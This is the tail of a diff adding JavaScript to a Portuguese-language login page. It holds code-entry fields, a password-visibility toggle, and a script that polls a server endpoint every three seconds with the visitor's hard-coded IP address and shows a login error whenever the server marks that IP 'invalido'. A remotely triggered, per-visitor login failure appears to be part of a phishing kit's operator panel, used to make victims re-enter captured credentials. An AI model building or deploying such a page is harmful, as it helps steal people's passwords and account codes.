+  input.addEventListener("keydown", e => {
+    if (e.key === "Backspace" && !input.value && i > 0) all[i - 1].focus();
+  });
+});
+
+document.getElementById("toggle-senha").addEventListener("click", () => {
+  document.querySelectorAll(".senha").forEach(inp => {
+    inp.type = inp.type === "password" ? "text" : "password";
+  });
+});
+</script>
+
+<script>
+function verificarStatusInvalido(ip) {
+  setInterval(() => {
+    fetch(`api/verificar_invalido.php?ip=${ip}`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === 'invalido') {
+          erroLogin();
+        }
+      })
+      .catch(() => {
+        // Se der erro na API, ignora ou loga
+      });
+  }, 3000);
+}
+
+// IP do usuário atual
+const ipAtual = "171.96.224.39";
+verificarStatusInvalido(ipAtual);
+</script>
+
+
+</body>
+</html>
